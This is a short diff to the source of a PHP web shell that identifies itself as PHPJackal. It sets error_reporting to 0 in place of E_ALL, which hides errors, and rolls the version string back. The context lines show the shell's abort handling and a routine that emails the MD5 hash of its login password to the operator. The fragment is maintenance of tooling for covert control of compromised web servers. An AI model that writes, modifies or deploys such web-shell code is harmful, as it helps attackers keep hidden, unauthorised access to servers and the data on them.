@@ -71,7 +71,7 @@ $Ignore_Abort = false;
 
 
 #---------------BOF-------------#
-error_reporting (E_ALL);
+error_reporting (0);
 @ob_clean ();
 ignore_user_abort ( $Ignore_Abort );
 if (! isset ( $_SERVER ))
@@ -181,7 +181,7 @@ function hlinK($str = '') {
 }
 header ( 'Cache-Control: no-cache, must-revalidate' );
 header ( 'Expires: Mon, 7 Aug 1988 05:00:00 GMT' );
-$VERSION = '3.1.1';
+$VERSION = '3.1.0';
 $MaSe = '';
 if (! empty ( $_REQUEST ['forgeT'] ) && ! empty ( $EMail )) {
 	if (mail ( $EMail, 'PHPJackal Password', 'MD5 hash of your password  on ' . $_SERVER ['HTTP_HOST'] . ' is "' . $Login_Hash . '"' ))
